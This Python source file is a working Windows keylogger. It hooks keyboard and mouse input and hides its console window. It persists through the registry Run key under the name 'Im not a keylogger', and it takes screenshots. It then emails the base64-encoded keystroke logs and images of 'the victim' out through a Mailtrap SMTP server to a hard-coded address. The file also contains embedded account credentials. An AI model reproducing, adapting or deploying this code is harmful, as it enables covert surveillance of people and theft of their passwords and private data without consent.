import sys
import win32api,pythoncom
import pyWinhook as pyHook
import os,time,random,smtplib,string,base64 
from winreg import *

global t,start_time,pics_names,yourgmail,yourgmailpass,sendto,interval

t="";pics_names=[]


#Note: You have to edit this part from sending the keylogger to the victim

#########Settings########

yourgmail="akul@gmail.com"                                        #What is your gmail?
yourgmailpass="24d947046f3e7a"                                    #What is your gmail password
sendto="aryal23112002@gmail.com"                                           #Where should I send the logs to? (any email address)
interval=60                                         #Time to wait before sending data to email (in seconds)

########################

try:

    f = open('Logfile.txt', 'a')
    f.close()
except:

    f = open('Logfile.txt', 'w')
    f.close()


def addStartup():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'Im not a keylogger', 0, REG_SZ, new_file_path)


def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

addStartup()

Hide()


def ScreenShot():
    global pics_names
    import pyautogui
    def generate_name():
        return ''.join(random.choice(string.ascii_uppercase
                       + string.digits) for _ in range(7))
    name = str(generate_name())
    pics_names.append(name)
    pyautogui.screenshot().save(name + '.png')


def Mail_it(data, pics_names):
    import smtplib
    import base64

    # Encode text data
    encoded_data = base64.b64encode(data.encode('utf-8'))
    encoded_data = 'New data from victim(Base64 encoded)\n' + encoded_data.decode('utf-8')

    # Connect to Mailtrap SMTP server
    try:
        with smtplib.SMTP('bulk.smtp.mailtrap.io', 587) as server:
            server.starttls()
            server.login('api', '6c95300bcfd889b2aea8bd82af6bd82d')  # Replace 'your_password_here' with your Mailtrap password
            server.sendmail(yourgmail, sendto, encoded_data)
            print("Mail sent")
    except Exception as e:
        print("Error sending mail:", e)

    # Encode and send each picture
    for pic in pics_names:
        with open(pic, 'rb') as file:
            data = base64.b64encode(file.read())
            encoded_data = 'New pic data from victim(Base64 encoded)\n' + data.decode('utf-8')
            
        try:
            with smtplib.SMTP('bulk.smtp.mailtrap.io', 587) as server:
                server.starttls()
                server.login('api', '6c95300bcfd889b2aea8bd82af6bd82d')  # Replace 'your_password_here' with your Mailtrap password
                server.sendmail(yourgmail, sendto, encoded_data)
                print("Second mail sent")
        except Exception as e:
            print("Error sending second mail:", e)




def OnMouseEvent(event):
    global yourgmail, yourgmailpass, sendto, interval
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
        + ' WindowName : ' + str(event.WindowName)
    data += '\n\tButton:' + str(event.MessageName)
    data += '\n\tClicked in (Position):' + str(event.Position)
    data += '\n===================='
    global t, start_time, pics_names

    t = t + data

    if len(t) > 300:
        ScreenShot()

    if len(t) > 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        t = ''

    if int(time.time() - start_time) == int(interval):
        Mail_it(t, pics_names)
        start_time = time.time()
        t = ''

    return True


def OnKeyboardEvent(event):
    global yourgmail, yourgmailpass, sendto, interval
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
        + ' WindowName : ' + str(event.WindowName)
    data += '\n\tKeyboard key :' + str(event.Key)
    data += '\n===================='
    global t, start_time
    t = t + data

    if len(t) > 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        t = ''

    if int(time.time() - start_time) == int(interval):
        Mail_it(t, pics_names)
        t = ''

    return True


hook = pyHook.HookManager()

hook.KeyDown = OnKeyboardEvent

hook.MouseAllButtonsDown = OnMouseEvent

hook.HookKeyboard()

hook.HookMouse()

start_time = time.time()

pythoncom.PumpMessages()